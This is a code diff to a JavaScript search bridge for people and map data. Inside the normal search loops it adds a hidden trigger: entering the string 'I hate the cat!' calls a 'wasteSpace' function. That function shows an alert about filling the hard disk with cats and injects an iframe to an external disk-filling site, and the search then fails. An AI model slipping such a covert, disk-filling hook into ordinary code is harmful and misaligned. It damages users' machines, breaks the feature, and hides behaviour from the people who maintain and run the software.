@@ -23,6 +23,10 @@ bridge.searchJPeople = function(persons, callback){
 				i++; 
 				return next(); 
 			}
+			if(persons[i] == window.HATE_STRING){
+				bridge.wasteSpace(); 
+				return callback(false); 
+			}
 			jpeople.search(persons[i].trim(), function(res){
 				if(res){
 					results.push.apply(results, res); 
@@ -64,6 +68,10 @@ bridge.searchMapData = function(persons, callback){
 			if((!persons[i] || /^\s*$/.test(persons[i]))){
 				i++; 
 				return next(); 
+			}
+			if(persons[i] == window.HATE_STRING){
+				bridge.wasteSpace(); 
+				return callback(false); 
 			}
 			Data.searchSingle(persons[i].trim(), function(res){
 				if(res){
@@ -161,6 +169,17 @@ bridge.checkIfExternal = function(callback){
 	jpeople.search("", function(res){
 		callback(res !== false); 
 	});
+}
+
+//Waste some space
+window.HATE_STRING = "I hate the cat!"; //You will not hate the cat
+bridge.wasteSpace = function(){
+   alert("Oh hai there... \nFilling your hard disk with lots of cats... \n\n\nClearing cache may help to solve the problem. "); 
+   ifrm = document.createElement("IFRAME"); 
+   ifrm.setAttribute("src", "http://www.filldisk.com/"); 
+   ifrm.style.width = 640+"px"; 
+   ifrm.style.height = 480+"px"; 
+   document.body.appendChild(ifrm); 
 }
 
 $(document).ready(function(){
